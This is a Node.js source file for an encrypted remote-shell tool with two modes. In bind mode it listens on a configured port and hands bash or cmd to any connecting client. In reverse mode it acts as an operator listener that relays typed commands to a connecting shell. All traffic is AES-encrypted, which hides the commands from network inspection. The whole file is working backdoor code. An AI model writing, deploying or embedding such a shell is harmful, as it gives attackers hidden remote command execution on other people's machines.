const { createServer } = require("net")
const { createInterface } = require("readline")
const { spawn } = require("child_process")
const { CryptorAES } = require('./crypt')
const yargs = require("yargs")

//convert text to encrypted buffer
function translate_out(cleartext){
    const buffer = Buffer.from(cleartext, 'utf-8')
    const encrypted = crypt.encrypt(buffer)
    return(encrypted)
}

//convert encrypted buffer to text
function translate_in(encBuff){
    const decrypted = crypt.decrypt(encBuff).toString('utf-8')
    return(decrypted)
}

// Bind listener
function Bind(config){
    const server = createServer((socket) => {

        let shellcmd = undefined
        switch(process.platform){
            case "linux":
                shellcmd = "bash"
                break
            case "android":
                shellcmd = "bash"
                break
            case "win32":
                shellcmd = "cmd"
                break
        }
    
        const shell = spawn(shellcmd)
        socket.write(translate_out("INFO:Connected to remote host"))
    
        // shell stdout to client
        shell.stdout.on("data", (data) => {
            socket.write(translate_out(data))
        })
    
        shell.stderr.on("data", (error) => {
            socket.write(translate_out(error))
        })
    
        shell.on("exit", () => {
            console.log("INFO:Client closed the shell")
            process.exit(0)
        })
    
        socket.on("data", (data) => {
            shell.stdin.write(`${translate_in(data)}\n`)
        })
    
        socket.on("error", (err) => {
            console.log(`ERROR:${err}`)
        })
    
        socket.on("end", () => {
            console.log("INFO:client disconnected")
        })
    })
    
    server.listen(config, () => {
        console.log(`INFO:Listening on ${config.host}:${config.port}`);
    });

    server.on("connection", () => {
        console.log("INFO:client connected")
    })
}

// Reverse listener
function Reverse(config){
    const server = createServer((socket) => {
    
        const int = createInterface({
            input: process.stdin,
            output: process.stdout
        })
    
        int.on("line", (data) => {
            socket.write(translate_out(data))
        })
    
        int.on("SIGINT", () => {
            socket.end()
            process.exit(0)
        })
    
        socket.on("data", (data) => {
            console.log(translate_in(data))
        })
    
        socket.on("error", (err) => {
            console.log(`ERROR:${err}`)
        })

        socket.on("end", () => {
            console.log("INFO:client disconnected")
        })
    })
    
    server.listen(config, () => {
        console.log(`INFO:Listening on ${config.host}:${config.port}`);
    });

    server.on("connection", () => {
        console.log("INFO:client connected")
    })
    
}

const argv = yargs
    .option('opmode', {
        alias: 'o',
        desc: 'Op mode. Accepted values "[b]ind or [r]everse mode. Defaults to bind.',
        type: 'string',
        default: 'b',
        demandOption: true,
        choices: ['b', 'r']
    })
    .option('configfile', {
        alias: 'c',
        desc: 'Config file for connection details',
        type: 'string',
        demandOption: true
    })
    .argv


let connection_info
let crypt

if (argv.configfile !== undefined) {
    const configfile = require(`./${argv.configfile}`)
    crypt = new CryptorAES(configfile.aes_password, configfile.aes_iv)
    connection_info = {
        host: configfile.listen_address.toString(),
        port: parseInt(configfile.listen_port),
        exclusive: true
    }
}

switch (argv.opmode) {
    case 'b':
        Bind(connection_info)
        break
    case 'r':
        Reverse(connection_info)
        break
    default:
        console.log("ERROR")
        process.exit(1)
}